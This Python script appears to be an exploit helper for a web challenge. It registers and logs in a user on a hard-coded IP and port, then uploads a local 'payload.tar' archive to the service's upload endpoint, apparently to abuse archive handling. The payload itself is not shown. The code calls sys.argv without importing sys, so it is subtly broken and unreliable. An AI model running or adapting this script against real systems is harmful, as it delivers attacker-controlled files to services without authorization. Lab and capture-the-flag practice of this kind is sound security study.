import requests
USERNAME = "normal_user"
PASSWORD = "normal_password"
ARCHIVE_NAME = "payload.tar"
BASE_URL = "http://83.136.255.53:39663"

def main():
    global BASE_URL
    if len(sys.argv) > 1:
        BASE_URL = sys.argv[1]
    print(f"[*] Target: {BASE_URL}")

    session = requests.Session()
    create_account(session)
    if login(session):
        upload(session)

def create_account(session: requests.Session):
    data = {
        "username":USERNAME,
        "password":PASSWORD
    }
    resp = session.post(f"{BASE_URL}/register", json=data) 
    
    if resp.ok:
        print(f"Successfully created user '{USERNAME}' with password '{PASSWORD}'")
        return True
    else:
        # Try logging in if already exists
        if "UNIQUE constraint failed" in resp.text or "already exists" in resp.text:
             print(f"User '{USERNAME}' already exists.")
             return True
        print(f"Error while creating account for user '{USERNAME}'")
        print(resp.text)
        return False

def login(session: requests.Session):
    data = {
        "username":USERNAME,
        "password":PASSWORD
    }
    resp = session.post(f"{BASE_URL}/login", json=data)
    if resp.ok:
        print(f"Successfully logged in for user '{USERNAME}' with password '{PASSWORD}'")
        return True
    else:
        print(f"Error while logging in for user '{USERNAME}'")
        print(resp.text)
        return False

def upload(session: requests.Session):
    try:
        files = {'archive': open(ARCHIVE_NAME, 'rb')}
        resp = session.post(f"{BASE_URL}/user/upload", files=files)
        if resp.ok:
            print(f"Successfully uploaded archive!")
            return True
        else:
            print(f"Error while uploading archive!")
            print(resp.text)
            return False
    except FileNotFoundError:
        print(f"Error: {ARCHIVE_NAME} not found.")
        return False

if __name__ == "__main__":
    main()
